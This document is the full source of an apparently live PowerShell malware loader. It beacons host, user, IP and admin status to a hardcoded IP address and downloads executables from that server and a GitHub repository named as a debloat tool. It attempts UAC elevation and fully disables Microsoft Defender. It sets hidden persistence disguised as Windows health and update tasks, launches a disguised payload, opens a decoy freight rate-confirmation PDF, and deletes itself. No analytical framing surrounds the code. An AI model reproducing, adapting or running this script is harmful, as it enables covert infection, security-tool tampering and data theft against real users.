$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}

$srv='https://193.26.115.196'
$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
$sources=@($srv,$gh)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }

$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
    }catch{
        _log "CB: $stage err: $($_.Exception.Message)"
    }
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{
    $null=[System.Net.Dns]::GetHostAddresses('193.26.115.196')
    _log "S0: ip ok"
}catch{
    _log "S0: ip fail: $($_.Exception.Message)"
}

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

function _dl($n){
    foreach($src in $sources){
        try{
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData("$src/$n")
            _log "DL: $n $($d.Length)"
            return ,$d
        }catch{
            _log "DL: $n fail from $src"
        }
    }
    _log "DL: $n fail all sources"
    return $null
}

function _run($n,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        Start-Process $p -WindowStyle Hidden | Out-Null
        _log "$s : $l ok"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runWait($n,$a,$s,$l,$sec){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        $proc=Start-Process $p -ArgumentList $a -NoNewWindow -PassThru
        _log "$s : $l started pid=$($proc.Id), waiting ${sec}s"
        Start-Sleep $sec
        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
        _log "$s : $l exit=$($proc.ExitCode)"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

# ═══════════════════════════════════════════
# S1: ELEVATION via CMSTPLUA
# ═══════════════════════════════════════════
if(-not $cbIsAdmin){
    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
    Start-Sleep 15
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    _log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){
        _cb 'S1' 'ok' 'elevation ok'
    }else{
        _cb 'S1' 'warn' 'elevation fail, continuing as user'
    }
}

# ═══════════════════════════════════════════
# S2: DEFENDER — full takedown (admin only)
# ═══════════════════════════════════════════
if($cbIsAdmin){
    # 1) Tamper Protection OFF — must be first, everything else depends on it
    try{
        Set-MpPreference -DisableTamperProtection $true -ErrorAction Stop
        _log "S2: tamper off (cmdlet)"
    }catch{
        _log "S2: tamper cmdlet fail, trying registry"
        try{
            $tpKey='HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
            if(-not(Test-Path $tpKey)){New-Item -Path $tpKey -Force|Out-Null}
            Set-ItemProperty -Path $tpKey -Name 'TamperProtection' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
            _log "S2: tamper off (reg)"
        }catch{
            _log "S2: tamper reg fail: $_"
        }
    }

    # 2) Exclusion paths — wmdrs.exe will land here
    $exclPaths=@("$env:TEMP","$env:APPDATA\Microsoft","$env:LOCALAPPDATA\Microsoft","$env:USERPROFILE\Downloads")
    foreach($ep in $exclPaths){
        try{
            New-Item -Path $ep -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            Add-MpPreference -ExclusionPath $ep -ErrorAction SilentlyContinue | Out-Null
        }catch{}
    }

    # 3) Process exclusions
    $exclProcs=@('wmdrs.exe','wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe','windefctl.exe','cmd.exe')
    foreach($xp in $exclProcs){
        try{Add-MpPreference -ExclusionProcess $xp -ErrorAction SilentlyContinue | Out-Null}catch{}
    }

    # 4) Full disable via cmdlets
    try{
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableOnAccessProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableAntiSpyware $true -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
        _log "S2: all cmdlets disabled"
    }catch{
        _log "S2: cmdlets fail: $_"
    }

    # 5) Registry hard-disable
    try{
        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
        if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $dp -Name 'DisableRoutinelyTakingAction' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        $rtp="$dp\Real-Time Protection"
        if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force | Out-Null
        _log "S2: reg hard-disable ok"
        _cb 'S2' 'ok' 'defender reg disabled'
    }catch{
        _log "S2: reg fail: $_"
    }

    # 6) Stop + disable Defender service
    try{
        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        _log "S2: WinDefend stopped+disabled"
    }catch{
        _log "S2: service fail: $_"
    }

    # 7) Kill Security Center / WMI shell notifications
    try{
        Stop-Service -Name 'SecurityHealthService' -Force -ErrorAction SilentlyContinue
        Stop-Service -Name 'wscsvc' -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray' -Name 'HideSecurityHealth' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        _log "S2: security center killed"
    }catch{
        _log "S2: sec center fail: $_"
    }
}

# ═══════════════════════════════════════════
# S2b: DEFENDER KILL — windefctl.exe binary (self-elevating)
# ═══════════════════════════════════════════
_log "S2b: windefctl exec (admin=$cbIsAdmin)"
_runWait 'windefctl.exe' 'kill' 'S2b' 'defkill' 18 | Out-Null
_cb 'S2b' 'ok' 'defkill done'
Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null

# ═══════════════════════════════════════════
# S3: PERSISTENCE
# ═══════════════════════════════════════════
$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\u.ps1 && powershell -w hidden -NoP -file %TEMP%\u.ps1"
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
}catch{}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
    }catch{}

    $taskName='WindowsHealthMonitor'
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
}

_cb 'S3' 'ok' 'persist ok'

# ═══════════════════════════════════════════
# S5: PAYLOAD — PatchPulsaar.exe → wmdrs.exe
# ═══════════════════════════════════════════
$payloadPath="$env:APPDATA\Microsoft\wmdrs.exe"
$payloadExists=(Test-Path $payloadPath)
_log "S5: exists=$payloadExists at $payloadPath"

if(-not $payloadExists){
    # Fallback check: LocalAppData
    $fallbackPath="$env:LOCALAPPDATA\Microsoft\wmdrs.exe"
    if(Test-Path $fallbackPath){
        $payloadPath=$fallbackPath
        $payloadExists=$true
        _log "S5: fallback found at $fallbackPath"
    }
}

if($payloadExists){
    # Already deployed — just launch
    try{
        $p=Start-Process $payloadPath -WindowStyle Hidden -PassThru
        _log "S5: re-launch PID=$($p.Id) from $payloadPath"
        _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
    }catch{
        _log "S5: re-launch fail: $_, will re-download"
        $payloadExists=$false
    }
}

if(-not $payloadExists){
    _log "S5: downloading PatchPulsaar"
    $payloadBytes=_dl 'wdsr681f3e18.exe'
    if($payloadBytes){
        $primaryPath="$env:TEMP\wmdrs.exe"
        [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null

        # Copy to excluded dirs
        $copyTargets=@("$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
        foreach($ct in $copyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $primaryPath $ct -Force
                _log "S5: copied to $ct"
            }catch{
                _log "S5: copy fail $ct : $_"
            }
        }

        # Launch from AppData (excluded path)
        try{
            $launchPath="$env:APPDATA\Microsoft\wmdrs.exe"
            $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
            _log "S5: payload PID=$($p.Id) from AppData"
            _cb 'S5' 'ok' "PID=$($p.Id)"
        }catch{
            _log "S5: launch fail: $_"
            _cb 'S5' 'fail' "launch err"
        }

        # Clean temp copy only
        Remove-Item "$env:TEMP\wmdrs.exe" -Force -ErrorAction SilentlyContinue | Out-Null
    }else{
        _log "S5: payload dl fail"
        _cb 'S5' 'fail' 'dl fail'
    }
}

# ═══════════════════════════════════════════
# S7: PDF DECOY — first run only
# ═══════════════════════════════════════════
$markerPath="$env:APPDATA\Microsoft\wmdrs.seen"
if(-not (Test-Path $markerPath)){
    $pdf='Rate_Confirmation_LD-2026-0847.pdf'
    $pdfPath="$env:USERPROFILE\Downloads\$pdf"
    $pdfBytes=_dl $pdf
    if($pdfBytes){
        [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)|Out-Null
        try{
            Start-Process $pdfPath | Out-Null
            _cb 'S7' 'ok' 'pdf ok'
            # Mark as shown
            Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
            _log "S7: pdf opened, marker set"
        }catch{_cb 'S7' 'warn' 'pdf open fail'}
    }else{_cb 'S7' 'warn' 'pdf dl fail'}
}else{
    _log "S7: skip (already shown)"
}

# ═══════════════════════════════════════════
# S9: CLEANUP + SELF-DELETE
# ═══════════════════════════════════════════
Start-Sleep 5
Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\ElevatorShellCode.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\PatchPulsaar.exe" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden | Out-Null
}

_log 'S9: done'
_cb 'S9' 'ok' 'done'
